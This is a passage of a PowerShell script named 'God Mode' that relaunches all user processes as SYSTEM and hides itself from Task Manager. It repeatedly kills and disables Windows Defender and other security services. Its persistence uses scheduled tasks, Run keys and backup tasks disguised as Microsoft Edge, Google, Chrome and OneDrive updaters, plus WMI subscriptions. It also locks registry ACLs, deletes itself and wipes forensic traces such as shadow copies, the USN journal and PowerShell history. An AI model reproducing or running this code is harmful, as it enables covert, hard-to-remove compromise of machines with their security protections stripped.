    # Hybrid elevation: token stealing first, scheduled task fallback.
    # This centralizes all elevation logic so both Invoke-ExistingProcessElevation
    # and Start-Monitoring automatically get the dual-path robustness.
    $null = Invoke-HybridElevation -Path $Path -Arguments $Arguments
}

function Test-SystemProcessExists {
    param([string]$ProcessName)
    try {
        $procs = Get-CimInstance Win32_Process -Filter "Name='$ProcessName'" -ErrorAction SilentlyContinue
        if ($procs) {
            foreach ($p in $procs) {
                try {
                    $owner = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue
                    if ($owner.User -eq "SYSTEM") { return $true }
                } catch { }
            }
        }
    } catch { }
    return $false
}

function Stop-NonSystemInstances {
    param([string]$ProcessName)
    try {
        $procs = Get-CimInstance Win32_Process -Filter "Name='$ProcessName'" -ErrorAction SilentlyContinue
        if ($procs) {
            foreach ($p in $procs) {
                try {
                    $owner = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue
                    if ($owner.User -ne "SYSTEM") {
                        Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
                        Write-Log -Message "Killed non-SYSTEM $ProcessName PID=$($p.ProcessId) to force SYSTEM-only" -Type "INFO" -Color Gray
                    }
                } catch { }
            }
        }
    } catch { }
}

function Invoke-ExistingProcessElevation {
    $isSystem = ([Environment]::UserName -eq "SYSTEM") -or (([Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -eq "S-1-5-18")
    if (-not $isSystem) {
        Write-Log -Message "Not running as SYSTEM -- escalating to SYSTEM via temporary service for aggressive process takeover." -Type "INFO" -Color Yellow
        $tempScript = Join-Path $env:TEMP "GodMode_ElevateAll_$(Get-Random -Minimum 10000 -Maximum 99999).ps1"
        Copy-Item -Path $PSCommandPath -Destination $tempScript -Force
        $result = Invoke-AsSystem -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`" -ElevateAllProcesses" -MaxWaitSeconds 180
        Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
        if ($result.Success) {
            Write-Log -Message "Aggressive elevation completed via SYSTEM service. All processes should now be SYSTEM." -Type "INFO" -Color Green
        } else {
            Write-Log -Message "Aggressive elevation failed: $($result.Output)" -Type "ERROR" -Color Red
        }
        return
    }
    Write-Log -Message "SYSTEM context confirmed. Aggressively elevating ALL user processes to SYSTEM..." -Type "INFO" -Color Green
    # Critical processes that must never be killed/restarted (core OS + script host)
    $CriticalProcs = @("csrss.exe", "lsass.exe", "services.exe", "smss.exe", "winlogon.exe", "wininit.exe", "svchost.exe", "dwm.exe", "fontdrvhost.exe", "Memory Compression", "Registry", "System", "Secure System", "powershell.exe", "pwsh.exe", "cmd.exe", "conhost.exe", "explorer.exe")
    $systemAccounts = @("SYSTEM", "NETWORK SERVICE", "LOCAL SERVICE", "DWM-1", "UMFD-1", "UMFD-0")
    try {
        $allProcs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    } catch {
        Write-Log -Message "Get-CimInstance failed, falling back to Get-WmiObject: $_" -Type "WARN" -Color Yellow
        $allProcs = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue
    }
    # Aggressive scan: ALL non-system-account processes with valid .exe paths
    $targetProcs = @()
    foreach ($proc in $allProcs) {
        if ($proc.ProcessId -le 4) { continue }
        if (-not $proc.ExecutablePath) { continue }
        if ($proc.ExecutablePath -notlike "*.exe") { continue }
        $procName = [System.IO.Path]::GetFileName($proc.ExecutablePath)
        if ($CriticalProcs -contains $procName) { continue }
        try {
            $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
            if (-not $owner) { continue }
            if ($owner -in $systemAccounts) { continue }
        } catch { continue }
        $targetProcs += $proc
    }
    $total = $targetProcs.Count
    $count = 0
    $skipped = 0
    Write-Log -Message "Aggressive scan found $total non-SYSTEM processes to elevate." -Type "INFO" -Color Yellow
    $batchLines = @("@echo off")
    $needBatch = $false
    $processedNames = @()
    foreach ($proc in $targetProcs) {
        $count++
        if ($count % 5 -eq 0 -or $count -eq $total) {
            Write-Log -Message "Preparing process $count of $total ($skipped skipped)..." -Type "INFO" -Color Gray
        }
        $procName = [System.IO.Path]::GetFileNameWithoutExtension($proc.ExecutablePath)
        # Deduplicate: only handle each unique process name once
        if ($processedNames -contains $procName) { continue }
        $processedNames += $procName

        # Always purge non-SYSTEM instances before starting a SYSTEM one
        Stop-NonSystemInstances -ProcessName "$procName.exe"
        Start-Sleep -Milliseconds 300

        # If a SYSTEM instance is already present after cleanup, skip
        if (Test-SystemProcessExists -ProcessName "$procName.exe") {
            $skipped++
            continue
        }

        $needBatch = $true
        $path = $proc.ExecutablePath
        $arguments = ""
        if ($proc.CommandLine) {
            $cmdLine = $proc.CommandLine
            if ($cmdLine.StartsWith('"')) {
                $endQuote = $cmdLine.IndexOf('"', 1)
                if ($endQuote -gt 0 -and $endQuote -lt $cmdLine.Length - 1) {
                    $arguments = $cmdLine.Substring($endQuote + 1).Trim()
                }
            } else {
                $firstSpace = $cmdLine.IndexOf(' ')
                if ($firstSpace -gt 0) {
                    $arguments = $cmdLine.Substring($firstSpace + 1).Trim()
                }
            }
        }
        $batchLines += "start `"`" `"$path`" $arguments"
    }
    if ($needBatch) {
        $TaskId = Get-Random -Minimum 10000 -Maximum 99999
        $BatchFile = Join-Path $env:TEMP "GodMode_ElevateAll_$TaskId.cmd"
        $batchLines += "echo ___DONE___"
        Set-Content -Path $BatchFile -Value ($batchLines -join "`r`n") -Encoding ASCII -Force
        try {
            # Already running as SYSTEM -- execute directly without a nested sc.exe service
            $null = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$BatchFile`"" -WindowStyle Hidden -Wait
            Write-Log -Message "Bulk SYSTEM elevation completed for $count processes." -Type "INFO" -Color Green
        } catch {
            Write-Log -Message "Bulk SYSTEM elevation exception: $_" -Type "ERROR" -Color Red
        }
        Remove-Item $BatchFile -Force -ErrorAction SilentlyContinue
    }
    Write-Log -Message "Aggressive process elevation complete ($count total, $skipped critical skipped)." -Type "INFO" -Color Gray
}

function Monitor-ElevateProcess {
    param([string]$Path, [string]$Arguments = "", [switch]$HideWindow)
    if (-not (Test-Path $Path)) {
        Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "ERROR" -Message "Target path does not exist: $Path" -RootCause "Executable missing. The process may have been uninstalled or moved."
        return $false
    }
    $procName = [System.IO.Path]::GetFileNameWithoutExtension($Path)
    if (Test-SystemProcessExists -ProcessName "$procName.exe") {
        # Aggressive: if a SYSTEM instance exists, wipe all non-SYSTEM instances so the app is 100% SYSTEM
        Stop-NonSystemInstances -ProcessName "$procName.exe"
        return $true
    }
    $elevated = Start-ProcessWithService -Path $Path -Arguments $Arguments -HideWindow:$HideWindow
    if ($elevated) {
        # After spawning SYSTEM, purge any Administrator/user duplicates so only SYSTEM remains
        Start-Sleep -Milliseconds 500
        Stop-NonSystemInstances -ProcessName "$procName.exe"
        Write-Log -Message "Monitor elevated: $procName (service + purge)" -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "EXIT" -Message "Success for $procName"
    } else {
        $rootCause = "Monitor service-elevation failed for $procName. sc.exe service creation may be blocked, or the target executable is not valid as a service path. This is expected in some configurations; the process will remain at its current privilege level."
        Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "ERROR" -Message "Service-elevation failed for $procName" -RootCause $rootCause
    }
    return $elevated
}

function Start-Monitoring {
    Write-DebugLog -FunctionName "Start-Monitoring" -Action "ENTRY"
    $Flag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
    if (-not ($Flag -and $Flag.$GodModeFlagRegName -eq 1)) {
        Write-Log -Message "God Mode is not enabled." -Type "ERROR" -Color Red
        Write-DebugLog -FunctionName "Start-Monitoring" -Action "EXIT" -Message "Aborted: flag registry missing"
        return
    }

    # Hide from simple Task Manager view
    Invoke-StealthMode

    Write-Log -Message "Monitoring started with auto-recovery and resurrection killer." -Type "INFO"

    # Critical processes that must never be re-elevated by the periodic loop.
    # Defined here so it is in scope for the periodic elevation block below.
    $CriticalProcs = @("csrss.exe", "lsass.exe", "services.exe", "smss.exe", "winlogon.exe", "wininit.exe", "svchost.exe", "taskhostw.exe", "sihost.exe", "dwm.exe", "fontdrvhost.exe", "Memory Compression", "Registry", "System", "Secure System", "powershell.exe", "pwsh.exe", "cmd.exe", "conhost.exe", "explorer.exe", "ShellHost.exe", "ctfmon.exe", "VBoxTray.exe", "ApplicationFrameHost.exe", "RuntimeBroker.exe", "SearchIndexer.exe", "SearchProtocolHost.exe")

    $lastElevated = @{}   # Process path -> last elevated time (for startup/periodic scans)
    $lastElevatedPid = @{} # Process ID -> elevated time (for new process detection)
    $lastKillCheck = [datetime]::MinValue
    $lastExistingElevate = [datetime]::MinValue
    $lastPidCleanup = [datetime]::MinValue
    $loopCount = 0

    # --- One-time elevation of all existing user-session processes at startup ---
    Invoke-ExistingProcessElevation

    while ($true) {
        try {
            Start-Sleep -Seconds 2
            $loopCount++
            if ($loopCount % 30 -eq 0) {
                Write-Log -Message "Monitor heartbeat: loop $loopCount, PIDs tracked: $($lastElevatedPid.Count)" -Type "INFO" -Color Gray
            }

            # --- Cleanup old PID entries to prevent memory growth ---
            if ((Get-Date) - $lastPidCleanup -gt [TimeSpan]::FromMinutes(5)) {
                $lastPidCleanup = Get-Date
                $now = Get-Date
                $oldPids = $lastElevatedPid.GetEnumerator() | Where-Object { $_.Value -lt $now.AddMinutes(-10) } | Select-Object -ExpandProperty Key
                foreach ($pid in $oldPids) { $lastElevatedPid.Remove($pid) | Out-Null }
            }

            # --- Resurrection Killer: Re-kill security services if they respawn (every 30 seconds) ---
            if ((Get-Date) - $lastKillCheck -gt [TimeSpan]::FromSeconds(30)) {
                $lastKillCheck = Get-Date
                $ServicesToKill = @("MsMpEng", "MsMpEngCP", "MpDefenderCoreService", "MsSense", "smartscreen", "SecurityHealthService", "MpCmdRun", "NisSrv", "SgrmBroker", "WerFault", "WerFaultSecure", "WaaSMedic", "SecurityHealthSystray")
                foreach ($procName in $ServicesToKill) {
                    try {
                        Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
                    } catch { }
                }
                # Re-apply service-level disable if any service got re-enabled
                $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc", "WaaSMedicSvc", "usosvc", "WerSvc", "DPS", "BITS", "NisSrv", "SgrmBroker")
                foreach ($svc in $DefenderServices) {
                    try {
                        $svcObj = Get-Service -Name $svc -ErrorAction SilentlyContinue
                        if ($svcObj -and $svcObj.Status -eq 'Running') {
                            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
                            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
                            Write-Log -Message "Resurrection killer: re-disabled $svc" -Type "INFO" -Color Gray
                        }
                    } catch { }
                }
            }

            # --- Periodic Existing Process Elevation: Re-elevate every 60 seconds ---
            if ((Get-Date) - $lastExistingElevate -gt [TimeSpan]::FromSeconds(60)) {
                $lastExistingElevate = Get-Date
                $ExistingProcesses = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -gt 0 -and $_.ExecutablePath -and $_.ExecutablePath -like "*.exe" }
                foreach ($proc in $ExistingProcesses) {
                    $procName = [System.IO.Path]::GetFileName($proc.ExecutablePath)
                    if ($CriticalProcs -contains $procName) { continue }
                    $path = $proc.ExecutablePath
                    $arguments = ""
                    if ($proc.CommandLine) {
                        $cmdLine = $proc.CommandLine
                        if ($cmdLine.StartsWith('"')) {
                            $endQuote = $cmdLine.IndexOf('"', 1)
                            if ($endQuote -gt 0 -and $endQuote -lt $cmdLine.Length - 1) {
                                $arguments = $cmdLine.Substring($endQuote + 1).Trim()
                            }
                        } else {
                            $firstSpace = $cmdLine.IndexOf(' ')
                            if ($firstSpace -gt 0) {
                                $arguments = $cmdLine.Substring($firstSpace + 1).Trim()
                            }
                        }
                    }
                    if (-not $lastElevated.ContainsKey($path) -or $lastElevated[$path] -lt (Get-Date).AddSeconds(-60)) {
                        $lastElevated[$path] = Get-Date
                        # If there is already a SYSTEM instance, kill any non-SYSTEM instances
                        if (Test-SystemProcessExists -ProcessName $procName) {
                            Stop-NonSystemInstances -ProcessName $procName
                        } else {
                        Monitor-ElevateProcess -Path $path -Arguments $arguments -HideWindow
                    }
                    Start-Sleep -Milliseconds 100
                }
            }
        }

        # --- New Process Elevation ---
        # Only elevate processes in user sessions (SessionId > 0) to avoid duplicating system processes
        $Now = Get-Date
        $newProcesses = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
            try {
                $_.SessionId -gt 0 -and
                $_.CreationDate -and
                ([System.Management.ManagementDateTimeConverter]::ToDateTime($_.CreationDate)) -gt $Now.AddSeconds(-10)
            } catch { $false }
        }

        foreach ($proc in $newProcesses) {
            if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
                $path = $proc.ExecutablePath
                $arguments = ""
                if ($proc.CommandLine) {
                    $cmdLine = $proc.CommandLine
                    # Extract arguments from command line
                    if ($cmdLine.StartsWith('"')) {
                        $endQuote = $cmdLine.IndexOf('"', 1)
                        if ($endQuote -gt 0 -and $endQuote -lt $cmdLine.Length - 1) {
                            $arguments = $cmdLine.Substring($endQuote + 1).Trim()
                        }
                    } else {
                        $firstSpace = $cmdLine.IndexOf(' ')
                        if ($firstSpace -gt 0) {
                            $arguments = $cmdLine.Substring($firstSpace + 1).Trim()
                        }
                    }
                }

                # PID-based tracking: each process instance gets elevated once
                if (-not $lastElevatedPid.ContainsKey($proc.ProcessId)) {
                    $lastElevatedPid[$proc.ProcessId] = Get-Date
                    Monitor-ElevateProcess -Path $path -Arguments $arguments -HideWindow
                }
            }
        }
        }
        catch {
            Write-DebugLog -FunctionName "Start-Monitoring" -Action "ERROR" -Message "Loop exception" -ErrorRecord $_
            Write-Log -Message "Monitoring error (recovering in 5s): $_" -Type "ERROR" -Color Red
            Start-Sleep -Seconds 5
        }
    }
}

function Enable-GodMode {
    Write-DebugLog -FunctionName "Enable-GodMode" -Action "ENTRY"

    # Ensure the installed script exists before registering tasks that depend on it
    if (-not (Test-Path $GodModeInstallScript)) {
        Write-Log -Message "God Mode install script not found. Copying payload to $GodModeInstallScript..." -Type "INFO" -Color Yellow
        if (-not (Test-Path $GodModeInstallDir)) { New-Item -ItemType Directory -Path $GodModeInstallDir -Force | Out-Null }
        Copy-Item -Path $PSCommandPath -Destination $GodModeInstallScript -Force
    }

    # --- Idempotency: if God Mode is already enabled and the monitoring loop is
    #     running, skip re-registration. This prevents the many -ToggleOn
    #     persistence layers (startup tasks, guardian, WMI) from killing the
    #     Start-Monitoring loop via Register-StealthTask -> Unregister-StealthTask.
    #     Without this, the loop flaps constantly after reboot and never elevates. ---
    $FlagAlreadySet = $false
    try {
        $ExistingFlag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
        if ($ExistingFlag -and $ExistingFlag.$GodModeFlagRegName -eq 1) { $FlagAlreadySet = $true }
    } catch {}
    if ($FlagAlreadySet) {
        $RunningMonitor = Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue |
            Where-Object { $_.State -eq 'Running' }
        if ($RunningMonitor) {
            Write-Log -Message "God Mode already enabled and monitor running ($($RunningMonitor.TaskName)). Skipping re-registration to prevent flapping." -Type "INFO" -Color Gray
            Write-DebugLog -FunctionName "Enable-GodMode" -Action "EXIT" -Message "Idempotent skip (monitor already running)"
            return
        }
    }

    # Ensure main task and guardian exist (for users who press 7 without 6)
    if (-not (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)) {
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        $Trigger1 = New-ScheduledTaskTrigger -AtStartup
        $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
        $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $GodModeTaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $PrincipalSettings -Force | Out-Null
        Write-Log -Message "Main God Mode task auto-registered." -Type "INFO" -Color Gray
    }
    if (-not (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue)) {
        $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
        $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $GodModeGuardianName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
        Write-Log -Message "God Mode guardian auto-registered." -Type "INFO" -Color Gray
    }

    if (-not (Test-Path $GodModeFlagRegPath)) { New-Item -Path $GodModeFlagRegPath -Force | Out-Null }
    Set-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -Value 1 -Force -ErrorAction SilentlyContinue
    Enable-DangerousMode
    Invoke-ExistingProcessElevation
    Register-StealthTask

    # --- Registry Persistence (Run keys) ---
    Write-Log -Message "Setting registry persistence keys..." -Type "INFO" -Color Gray
    $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Registry persistence keys set." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to set registry persistence: $_" -Type "WARN" -Color Yellow }

    # --- Multi-layer task redundancy (backup task names) ---
    Write-Log -Message "Registering backup persistence tasks..." -Type "INFO" -Color Gray
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_")
    foreach ($Prefix in $BackupPrefixes) {
        try {
            # Skip if any task with this prefix already exists (idempotent)
            if (Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue) {
                Write-Log -Message "Backup task prefix $Prefix already exists; skipping." -Type "INFO" -Color Gray
                continue
            }
            $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
            Write-Log -Message "Backup task $taskName registered." -Type "INFO" -Color Gray
        } catch { Write-Log -Message "Backup task $Prefix failed: $_" -Type "WARN" -Color Yellow }
    }

    # --- Self-protection: harden flag registry key ---
    try {
        if (Test-Path $GodModeFlagRegPath) {
            $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
            if ($RegKey) {
                $Acl = $RegKey.GetAccessControl()
                $Acl.SetAccessRuleProtection($true, $false)
                $Acl.Access | ForEach-Object { $Acl.RemoveAccessRule($_) | Out-Null }
                $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
                $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "ReadKey", "ContainerInherit,ObjectInherit", "None", "Allow")))
                $RegKey.SetAccessControl($Acl)
                $RegKey.Close()
            }
        }
    } catch { Write-Log -Message "Flag registry self-protection failed: $_" -Type "WARN" -Color Yellow }

    # --- WMI persistence (file-less fallback) ---
    Register-GodModeWMI

    # --- Self-destruct: delete original script from disk after persistence is set ---
    Invoke-SelfDestruct -Path $PSCommandPath

    # --- Anti-forensics: clear traces ---
    Write-Log -Message "Running anti-forensics cleanup..." -Type "INFO" -Color Gray
    Clear-ShadowCopies
    Clear-USNJournal
    Clear-CrashDumps
    Clear-PowerShellHistory
    Clear-RecentTraces

    # --- Deep persistence: harder to remove ---
    Register-DeepPersistence

    # --- Stealth mode: harder to detect ---
    Invoke-StealthMode

    Write-Log -Message "God Mode ENABLED" -Type "WARN" -Color Yellow
    Write-DebugLog -FunctionName "Enable-GodMode" -Action "EXIT" -Message "Success"
}

function Disable-GodMode {
    Write-DebugLog -FunctionName "Disable-GodMode" -Action "ENTRY"
    Remove-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
    Unregister-StealthTask

    # --- Remove backup task prefixes ---
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
    foreach ($Prefix in $BackupPrefixes) {
        try {
            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }

    # --- Remove registry persistence ---
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }

    Disable-DangerousMode

    # --- Restore flag registry key ACL so it can be re-enabled later ---
    try {
        if (Test-Path $GodModeFlagRegPath) {
            $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
            if ($RegKey) {
                $Acl = $RegKey.GetAccessControl()
                $Acl.SetAccessRuleProtection($false, $false)
                $Acl.Access | ForEach-Object { $Acl.RemoveAccessRule($_) | Out-Null }
                $RegKey.SetAccessControl($Acl)
                $RegKey.Close()
            }
        }
    } catch { Write-Log -Message "Flag registry ACL restore failed: $_" -Type "WARN" -Color Yellow }

    # --- Cleanup WMI persistence ---
    try {
        $WmiName = "Win32ProviderHealthCheck"
        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$WmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$WmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%$WmiName%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Write-Log -Message "WMI persistence removed." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "WMI cleanup failed: $_" -Type "WARN" -Color Yellow }

    # --- Cleanup deep persistence WMI ---
    try {
        $DeepWmiName = "Win32BootHealthCheck"
        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$DeepWmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$DeepWmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%$DeepWmiName%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Write-Log -Message "Deep persistence WMI removed." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Deep persistence WMI cleanup failed: $_" -Type "WARN" -Color Yellow }

    Write-Log -Message "God Mode DISABLED" -Type "WARN" -Color Yellow
    Write-DebugLog -FunctionName "Disable-GodMode" -Action "EXIT" -Message "Success"
}

function Show-GodModeStatus {
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " GOD MODE STATUS DETAIL                    " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # Current user identity
    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $IsAdmin = ([Security.Principal.WindowsPrincipal]$CurrentUser).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $IsBuiltIn = ($CurrentUser.User.Value -like "*-500")
    Write-Host "  Current User            : $($CurrentUser.Name)" -ForegroundColor White
    Write-Host "  User SID                : $($CurrentUser.User.Value)" -ForegroundColor White
    if ($IsBuiltIn) {
        Write-Host "  Built-in Administrator  : YES" -ForegroundColor Red
    } else {
        Write-Host "  Built-in Administrator  : NO" -ForegroundColor Yellow
    }
    if ($IsAdmin) {
        Write-Host "  Admin Privileges        : YES" -ForegroundColor Yellow
    } else {
        Write-Host "  Admin Privileges        : NO" -ForegroundColor Red
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # Core God Mode state
    $Flag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
    if ($Flag -and $Flag.$GodModeFlagRegName -eq 1) {
        Write-Host "  God Mode State          : ACTIVE" -ForegroundColor Red
    } else {
        Write-Host "  God Mode State          : INACTIVE" -ForegroundColor Green
    }

    # Stealth task status
    # Main God Mode tasks
    $MainTask = Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue
    $GuardianTask = Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue
    if ($MainTask -and $GuardianTask) {
        Write-Host "  Main Task + Guardian    : INSTALLED" -ForegroundColor Cyan
    } elseif ($MainTask -or $GuardianTask) {
        Write-Host "  Main Task + Guardian    : PARTIAL (1 missing)" -ForegroundColor Yellow
    } else {
        Write-Host "  Main Task + Guardian    : NOT INSTALLED" -ForegroundColor DarkGray
    }

    $StealthTasks = Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue
    if ($StealthTasks) {
        Write-Host "  Stealth Task            : INSTALLED ($($StealthTasks.Count) found)" -ForegroundColor Cyan
    } else {
        Write-Host "  Stealth Task            : NOT INSTALLED" -ForegroundColor DarkGray
    }

    # Defender processes
    $DefenderProcs = @("MsMpEng", "MsMpEngCP", "MpDefenderCoreService", "MsSense", "smartscreen", "SecurityHealthService")
    $RunningDefender = 0
    foreach ($proc in $DefenderProcs) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { $RunningDefender++ }
    }
    if ($RunningDefender -eq 0) {
        Write-Host "  Defender Processes      : ALL STOPPED ($RunningDefender/$($DefenderProcs.Count))" -ForegroundColor Green
    } else {
        Write-Host "  Defender Processes      : $RunningDefender RUNNING ($($DefenderProcs.Count) total)" -ForegroundColor Red
    }

    # Defender services
    $DefenderSvcs = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
    $RunningSvcs = 0
    foreach ($svc in $DefenderSvcs) {
        $svcObj = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($svcObj -and $svcObj.Status -eq 'Running') { $RunningSvcs++ }
    }
    if ($RunningSvcs -eq 0) {
        Write-Host "  Defender Services       : ALL STOPPED ($RunningSvcs/$($DefenderSvcs.Count))" -ForegroundColor Green
    } else {
        Write-Host "  Defender Services       : $RunningSvcs RUNNING ($($DefenderSvcs.Count) total)" -ForegroundColor Red
    }

    # Real-time monitoring
    try {
        $MpPref = Get-MpPreference -ErrorAction SilentlyContinue
        if ($MpPref -and $MpPref.DisableRealtimeMonitoring) {
            Write-Host "  Real-Time Monitoring    : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Real-Time Monitoring    : ENABLED (or indeterminate)" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Real-Time Monitoring    : UNKNOWN (Get-MpPreference failed)" -ForegroundColor DarkGray
    }

    # Firewall
    $FirewallProfiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue
    $FwEnabled = 0
    foreach ($fp in $FirewallProfiles) {
        if ($fp.Enabled) { $FwEnabled++ }
    }
    if ($FwEnabled -eq 0) {
        Write-Host "  Windows Firewall        : ALL PROFILES OFF" -ForegroundColor Green
    } else {
        Write-Host "  Windows Firewall        : $FwEnabled/$(($FirewallProfiles | Measure-Object).Count) PROFILES ON" -ForegroundColor Red
    }

    # UAC / LUA
    try {
        $lua = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -ErrorAction SilentlyContinue
        if ($lua -and $lua.EnableLUA -eq 0) {
